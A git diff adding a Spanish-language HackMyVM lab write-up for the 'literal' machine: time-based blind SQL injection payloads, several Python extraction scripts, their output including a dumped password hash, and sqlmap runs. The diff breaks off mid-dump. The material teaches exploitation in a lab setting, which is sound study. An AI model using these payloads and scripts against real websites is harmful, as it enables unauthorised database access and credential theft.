@@ -1,4 +1,3 @@
-<!--
 <!DOCTYPE html>
 <html>
   <head>
@@ -371,8 +370,699 @@ ydra (https://github.com/vanhauser-thc/thc-hydra) finished</span>
 <section class="post" id="sqli-time">
 <br><h3 class="post-title">SQL Injection - Time Based</h3><br>
 
+<p class="plain-text">Si miramos los <code class="language-plaintext highlighter-rouge">correos</code> que dumpeamos mediante la inyección <code class="language-plaintext highlighter-rouge">sql</code> podemos ver un nuevo <code class="language-plaintext highlighter-rouge">subdominio</code>, el cual es <code class="language-plaintext highlighter-rouge">forumtesting.literal.hmv</code> asi que lo agregamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">walter@forumtesting.literal.hmv  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"192.168.100.87 forumtesting.literal.hmv" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos ver una página de <code class="language-plaintext highlighter-rouge">categorias</code> donde al ver los <code class="language-plaintext highlighter-rouge">detalles</code> del foro nos envia a una nueva página, la cual se gestiona mediante el parametro <code class="language-plaintext highlighter-rouge">category_id</code></p>
+<a href="/hmv/literal/16.png" target="_blank"><div><p><img src="/hmv/literal/16.png"></p></div></a>
+<a href="/hmv/literal/17.png" target="_blank"><div><p><img src="/hmv/literal/17.png"></p></div></a>
+
+<p class="plain-text">Aqui también encontramos una <code class="language-plaintext highlighter-rouge">inyección</code> sql pero esta vez <code class="language-plaintext highlighter-rouge">blind</code> basada en <code class="language-plaintext highlighter-rouge">tiempo</code>, al pasarle como parametro <code class="language-plaintext highlighter-rouge">2 and sleep(5)-- -</code> tarda 5 segundos</p>
+<a href="/hmv/literal/19.png" target="_blank"><div><p><img src="/hmv/literal/19.png"></p></div></a>
+
+<p class="plain-text">Podemos aplicar una comparación con <code class="language-plaintext highlighter-rouge">substr</code> para mediante un <code class="language-plaintext highlighter-rouge">if</code> decirle que si la primera <code class="language-plaintext highlighter-rouge">posición</code> del resultado de <code class="language-plaintext highlighter-rouge">database()</code> es <code class="language-plaintext highlighter-rouge">a</code> tarde <code class="language-plaintext highlighter-rouge">5</code> segundos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="mi">2 </span><span class="o">and </span><span class="p">if(substr(database(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s">'a'</span><span class="p">, sleep(</span><span class="mi">5</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="c1">-- -  </span>
+</code></pre></div></div><br>
+<a href="/hmv/literal/21.png" target="_blank"><div><p><img src="/hmv/literal/21.png"></p></div></a>
+
+<p class="plain-text">Al cambiar la <code class="language-plaintext highlighter-rouge">primera</code> letra de la comparación por <code class="language-plaintext highlighter-rouge">f</code>, esta se cumple y tarda <code class="language-plaintext highlighter-rouge">5</code> segundos en responder, quiere decir que la primera letra de la <code class="language-plaintext highlighter-rouge">base de datos</code> es <code class="language-plaintext highlighter-rouge">f</code></p>
+<a href="/hmv/literal/20.png" target="_blank"><div><p><img src="/hmv/literal/20.png"></p></div></a>
+
+<p class="plain-text">Siguiendo esa logica podemos automatizar todo en un <code class="language-plaintext highlighter-rouge">script</code> de python, el que <code class="language-plaintext highlighter-rouge">itere</code> sobre los <code class="language-plaintext highlighter-rouge">caracteres</code> y las <code class="language-plaintext highlighter-rouge">posiciones</code>, cuando el tiempo de <code class="language-plaintext highlighter-rouge">respuesta</code> de la petición sea mayor a <code class="language-plaintext highlighter-rouge">1</code> segundo el caracter actual se <code class="language-plaintext highlighter-rouge">sumara</code> al valor final</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests, time
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Database"</span><span class="p">)
+
+value </span><span class="o">= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
+
+</span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+    </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+        query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select database()),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"</span><span class="p">  
+        time_start </span><span class="o">= </span><span class="p">time.time()
+        requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
+        time_end </span><span class="o">= </span><span class="p">time.time()
+
+        </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
+            value </span><span class="o">+= </span><span class="p">character
+            bar.status(value)
+
+bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Corremos el <code class="language-plaintext highlighter-rouge">script</code> y podemos ver que el caracter <code class="language-plaintext highlighter-rouge">+</code> lo toma como <code class="language-plaintext highlighter-rouge">positivo</code> cuando probablemente no lo es, asi que modificamos el script para <code class="language-plaintext highlighter-rouge">quitarlo</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py  
+[</span><span class="az">┐</span><span class="p">] Database:
+    [</span><span class="az">*</span><span class="p">] +foru</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation  
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos de nuevo el <code class="language-plaintext highlighter-rouge">script</code> y ahora conseguimos el <code class="language-plaintext highlighter-rouge">nombre</code> completo de la <code class="language-plaintext highlighter-rouge">base de datos</code> actualmente en uso, que esta vez es <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py  
+[</span><span class="ve">+</span><span class="p">] Database:
+    [</span><span class="az">*</span><span class="p">] forumtesting</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora en lugar de <code class="language-plaintext highlighter-rouge">database()</code> seleccionaremos el <code class="language-plaintext highlighter-rouge">schema_name</code> también <code class="language-plaintext highlighter-rouge">iteraremos</code> sobre otro <code class="language-plaintext highlighter-rouge">rango</code> del 0 al 5 para iterar sobre todos los <code class="language-plaintext highlighter-rouge">resultados</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3</span><span class="p">
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests, time
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Database"</span><span class="p">)
+
+value </span><span class="o">= </span><span class="s">""
+
+</span><span class="o">for </span><span class="p">db </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
+    value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "
+    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+            query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select schema_name from information_schema.schemata limit </span><span class="p">{db}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"  
+            </span><span class="p">time_start </span><span class="o">= </span><span class="p">time.time()
+            requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
+            time_end </span><span class="o">= </span><span class="p">time.time()
+
+            </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
+                value </span><span class="o">+= </span><span class="p">character
+                bar.status(value)
+
+bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos el script y obtenemos <code class="language-plaintext highlighter-rouge">todas</code> las bases de datos existentes, de nuevo podemos ver bases de datos por <code class="language-plaintext highlighter-rouge">defecto</code> asi que seguiremos con <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Databases:
+    [</span><span class="az">*</span><span class="p">] information_schema  
+    [</span><span class="az">*</span><span class="p">] performance_schema  
+    [</span><span class="az">*</span><span class="p">] forumtesting</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora modificaremos el script prara <code class="language-plaintext highlighter-rouge">iterar</code> no sobres las bases de datos si no por las <code class="language-plaintext highlighter-rouge">tablas</code>, seleccionando <code class="language-plaintext highlighter-rouge">table_name</code> donde la base de datos sea <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests, time
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)
+bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="s">"Tables"</span><span class="p">)
+
+value </span><span class="o">= </span><span class="s">""</span><span class="p">
+
+</span><span class="o">for </span><span class="p">table </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">):
+    value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "</span><span class="p">
+    </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+        </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+            query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select table_name from information_schema.tables where table_schema='forumtesting' limit </span><span class="p">{table}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"</span><span class="p">  
+            time_start </span><span class="o">= </span><span class="p">time.time()
+            requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
+            time_end</span><span class="o"> = </span><span class="p">time.time()
+
+            </span><span class="o">if </span><span class="p">(time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
+                value </span><span class="o">+= </span><span class="p">character
+                bar.status(value)
+
+bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo obtenemos todas las <code class="language-plaintext highlighter-rouge">tablas</code> existentes en la base de datos <code class="language-plaintext highlighter-rouge">forumtesting</code>, en total encontramos <code class="language-plaintext highlighter-rouge">5</code> de ellas, aunque no todas son interesantes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Tables:
+    [</span><span class="az">*</span><span class="p">] forum_category  
+    [</span><span class="az">*</span><span class="p">] forum_owner
+    [</span><span class="az">*</span><span class="p">] forum_posts
+    [</span><span class="az">*</span><span class="p">] forum_topics
+    [</span><span class="az">*</span><span class="p">] forum_users</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En el script crearemos una <code class="language-plaintext highlighter-rouge">lista</code> con las <code class="language-plaintext highlighter-rouge">tablas</code> para despues iterar sobre cada una de ellas y seleccionando <code class="language-plaintext highlighter-rouge">colum_name</code> dumpear las <code class="language-plaintext highlighter-rouge">columnas</code> de todas ellas</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests, time
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)
+
+tables </span><span class="o">= </span><span class="p">[</span><span class="s">"forum_category"</span><span class="p">,</span><span class="s"> "forum_owner"</span><span class="p">,</span><span class="s"> "forum_posts"</span><span class="p">,</span><span class="s"> "forum_topics"</span><span class="p">,</span><span class="s"> "forum_users"</span><span class="p">]
+
+</span><span class="o">for </span><span class="p">table </span><span class="o">in </span><span class="p">tables:
+    </span><span class="no">print</span><span class="p">(</span><span class="s">"</span><span class="mi">\r</span><span class="p">"</span><span class="p">)
+    bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="no">f</span><span class="s">"Dumpeando columnas de </span><span class="p">{table}</span><span class="am">"</span><span class="p">)
+
+    value </span><span class="o">= </span><span class="s">""
+
+    </span><span class="o">for </span><span class="p">column </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">):
+        value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "</span><span class="p">
+        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">20</span><span class="p">):
+            </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+                query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select column_name from information_schema.columns where table_schema='forumtesting' and table_name='</span><span class="p">{table}</span><span class="s">' limit </span><span class="p">{column}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"  </span><span class="p">
+                time_start </span><span class="o">= </span><span class="p">time.time()
+                requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
+                time_end </span><span class="o">= </span><span class="p">time.time()
+
+                </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
+                    value </span><span class="o">+= </span><span class="p">character
+                    bar.status(value)
+
+    bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ejecutamos y podemos ver las <code class="language-plaintext highlighter-rouge">columnas</code> de todas las tablas, realmente solo hay <code class="language-plaintext highlighter-rouge">2</code> que nos podrian interesar y estas son las tablas <code class="language-plaintext highlighter-rouge">forum_owner</code> y <code class="language-plaintext highlighter-rouge">forum_users</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_category:  
+    [</span><span class="az">*</span><span class="p">] category_id
+    [</span><span class="az">*</span><span class="p">] description
+    [</span><span class="az">*</span><span class="p">] name
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_owner:
+    [</span><span class="az">*</span><span class="p">] created
+    [</span><span class="az">*</span><span class="p">] email
+    [</span><span class="az">*</span><span class="p">] id
+    [</span><span class="az">*</span><span class="p">] password
+    [</span><span class="az">*</span><span class="p">] username
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_posts:
+    [</span><span class="az">*</span><span class="p">] created
+    [</span><span class="az">*</span><span class="p">] message
+    [</span><span class="az">*</span><span class="p">] name
+    [</span><span class="az">*</span><span class="p">] post_id
+    [</span><span class="az">*</span><span class="p">] topic_id
+    [</span><span class="az">*</span><span class="p">] user_id
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_topics:
+    [</span><span class="az">*</span><span class="p">] category_id
+    [</span><span class="az">*</span><span class="p">] created
+    [</span><span class="az">*</span><span class="p">] subject
+    [</span><span class="az">*</span><span class="p">] topic_id
+    [</span><span class="az">*</span><span class="p">] user_id
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columnas de forum_users:
+    [</span><span class="az">*</span><span class="p">] email
+    [</span><span class="az">*</span><span class="p">] name
+    [</span><span class="az">*</span><span class="p">] password
+    [</span><span class="az">*</span><span class="p">] user_id
+    [</span><span class="az">*</span><span class="p">] username</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos con la tabla <code class="language-plaintext highlighter-rouge">forum_owner</code>, creamos una lista con sus <code class="language-plaintext highlighter-rouge">columnas</code> e iterando sobre cada una de ellas en la tabla <code class="language-plaintext highlighter-rouge">users</code> de la database, obtenemos sus <code class="language-plaintext highlighter-rouge">valores</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">log
+</span><span class="o">import </span><span class="p">string, requests, time
+
+characters </span><span class="o">= </span><span class="p">string.ascii_lowercase </span><span class="o">+ </span><span class="p">string.punctuation </span><span class="o">+ </span><span class="p">string.digits
+characters </span><span class="o">= </span><span class="p">characters.replace(</span><span class="s">"+"</span><span class="p">,</span><span class="s">""</span><span class="p">)
+
+columns </span><span class="o">= </span><span class="p">[</span><span class="s">"created"</span><span class="p">, </span><span class="s">"email"</span><span class="p">,</span><span class="s"> "id"</span><span class="p">, </span><span class="s">"username"</span><span class="p">,</span><span class="s"> "password"</span><span class="p">]
+
+</span><span class="o">for </span><span class="p">column </span><span class="o">in </span><span class="p">columns:
+    </span><span class="no">print(</span><span class="s">"</span><span class="mi">\r</span><span class="s">"</span><span class="p">)
+    bar </span><span class="o">= </span><span class="p">log.progress(</span><span class="no">f</span><span class="s">"Dumpeando columna </span><span class="p">{column}</span><span class="s">"</span><span class="p">)
+
+    value </span><span class="o">=</span><span class="s"> ""
+
+    </span><span class="o">for </span><span class="p">dump </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">):
+        value </span><span class="o">+= </span><span class="s">"</span><span class="mi">\n\033</span><span class="s">[0;37m[</span><span class="mi">\033</span><span class="s">[0;34m*</span><span class="mi">\033</span><span class="s">[0;37m] "</span><span class="p">
+        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">32</span><span class="p">):
+            </span><span class="o">for </span><span class="p">character </span><span class="o">in </span><span class="p">characters:
+                query </span><span class="o">= </span><span class="no">f</span><span class="s">"2 and if(substr((select </span><span class="p">{column}</span><span class="s"> from forum_owner limit </span><span class="p">{dump}</span><span class="s">,1),</span><span class="p">{position}</span><span class="s">,1)='</span><span class="p">{character}</span><span class="s">',sleep(2),1)-- -"</span><span class="p">  
+                time_start </span><span class="o">= </span><span class="p">time.time()
+                requests.get(</span><span class="s">"http://forumtesting.literal.hmv/category.php?category_id=" </span><span class="o">+ </span><span class="p">query)
+                time_end </span><span class="o">= </span><span class="p">time.time()
+
+                </span><span class="o">if</span><span class="p"> (time_end </span><span class="o">- </span><span class="p">time_start) </span><span class="o">> </span><span class="mi">1</span><span class="p">:
+                    value </span><span class="o">+= </span><span class="p">character
+                    bar.status(value)
+
+    bar.success(value)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutarlo obtenemos todos los datos de la tabla <code class="language-plaintext highlighter-rouge">forum_owner</code>, sin embargo parece que la columna <code class="language-plaintext highlighter-rouge">password</code> esta limitandose por el <code class="language-plaintext highlighter-rouge">rango</code> de solo <code class="language-plaintext highlighter-rouge">32</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna created: 
+    [</span><span class="az">*</span><span class="p">] 2022-02-12
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna email: 
+    [</span><span class="az">*</span><span class="p">] carlos@forumtesting.literal.htb
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna id: 
+    [</span><span class="az">*</span><span class="p">] 1
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna username: 
+    [</span><span class="az">*</span><span class="p">] carlos
+
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna password: 
+    [</span><span class="az">*</span><span class="p">] 6705fe62010679f04257358241792b4</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Eliminamos todas las demas columnas para quedarnos solo con <code class="language-plaintext highlighter-rouge">password</code> y cambiamos el rango de <code class="language-plaintext highlighter-rouge">32</code> caracteres a <code class="language-plaintext highlighter-rouge">130</code>, ejecutamos y obtenemos el <code class="language-plaintext highlighter-rouge">hash</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">columns </span><span class="o">=</span><span class="p"> [</span><span class="s">"password"</span><span class="p">]
+.....................................
+        </span><span class="o">for </span><span class="p">position </span><span class="o">in </span><span class="no">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">130</span><span class="p">):  </span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Dumpeando columna password: 
+    [</span><span class="az">*</span><span class="p">] 6705fe62010679f04257358241792b41acba4ea896178a40eb63c743f5317a09faefa2e056486d55e9c05f851b222e6e7c5c1bd22af135157aa9b02201cf4e99  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Nuevamente esto pudimos hacerlo con <code class="language-plaintext highlighter-rouge">sqlmap</code>, con el parametro <code class="language-plaintext highlighter-rouge">-dbs</code> obtenemos todas las <code class="language-plaintext highlighter-rouge">bases de datos</code> existentes, entre ellas la que usamos <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url </span><span class="am">"http://forumtesting.literal.hmv/category.php?category_id=2"</span><span class="p"> -dbs  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
+</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
+</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
+</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql' 
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching database names
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of databases
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: 3
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: information_schema
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: performance_schema
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] retrieved: forumtesting
+available databases [3]:
+[*] forumtesting
+[*] information_schema
+[*] performance_schema</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">-tables</code> dumpearemos todas las <code class="language-plaintext highlighter-rouge">tablas</code> de la base de datos <code class="language-plaintext highlighter-rouge">forumtesting</code>, esto nos dejara las tablas entre ellas <code class="language-plaintext highlighter-rouge">forum_owner</code> que nos interesa</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap</span><span class="p"> --batch --url </span><span class="am">"http://forumtesting.literal.hmv/category.php?category_id=2"</span><span class="p"> -D forumtesting -tables  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
+</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
+</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
+</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching tables for database: 'forumtesting'
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching number of tables for database 'forumtesting'
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: 5
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_category
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_owner
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_posts
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_topics
+[</span><span class="az">23:10:04</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resumed: forum_users
+Database: forumtesting
+[5 tables]
++----------------+
+| forum_category |
+| forum_owner    |
+| forum_posts    |
+| forum_topics   |
+| forum_users    |
++----------------+</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Simplemente con el parametro <code class="language-plaintext highlighter-rouge">-dump</code> dumpeamos todo el <code class="language-plaintext highlighter-rouge">contenido</code> de las <code class="language-plaintext highlighter-rouge">columnas</code> de la tabla <code class="language-plaintext highlighter-rouge">forum_owner</code> de la base de datos <code class="language-plaintext highlighter-rouge">forumtesting</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sqlmap </span><span class="p">--batch --url </span><span class="am">"http://forumtesting.literal.hmv/category.php?category_id=2"</span><span class="p"> -D forumtesting -T forum_owner -dump  
+</span><span class="am">        ___
+       __H__
+ ___ ___[</span><span class="ro">.</span><span class="am">]_____ ___ ___  </span><span class="p">{</span><span class="c1">1.7.2#stable</span><span class="p">}
+</span><span class="am">|_ -| . [</span><span class="ro">(</span><span class="am">]     | .'| . |
+</span><span class="am">|___|_  [</span><span class="ro">,</span><span class="am">]_|_|_|__,|  _|
+</span><span class="am">      |_|V...       |_|   </span><span class="p">https://sqlmap.org
+
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] resuming back-end DBMS 'mysql'
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] testing connection to the target URL
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] the back-end DBMS is MySQL
+[</span><span class="az">23:10:05</span><span class="p">] [</span><span class="ve">INFO</span><span class="p">] fetching columns for table 'forum_owner' in database 'forumtesting'
